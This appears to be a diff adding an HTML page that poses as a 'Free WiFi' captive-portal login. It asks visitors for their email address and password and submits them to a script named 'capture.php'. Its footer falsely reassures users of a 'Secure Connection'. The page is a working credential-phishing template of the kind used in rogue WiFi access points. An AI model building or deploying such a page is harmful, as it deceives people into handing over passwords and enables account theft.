@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free WiFi - Login Required</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <div class="wifi-icon">
+                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+                        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+                        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+                        <circle cx="12" cy="20" r="1"></circle>
+                    </svg>
+                </div>
+                <h1>Welcome to Free WiFi</h1>
+                <p class="subtitle">Please log in to continue</p>
+            </div>
+
+            <form method="POST" action="capture.php" class="login-form">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="your@email.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+
+                <button type="submit" class="login-btn">Connect to WiFi</button>
+
+                <div class="terms">
+                    <p>By connecting, you agree to our Terms of Service and Privacy Policy</p>
+                </div>
+            </form>
+
+            <div class="footer">
+                <p>Secure Connection • No Registration Required</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
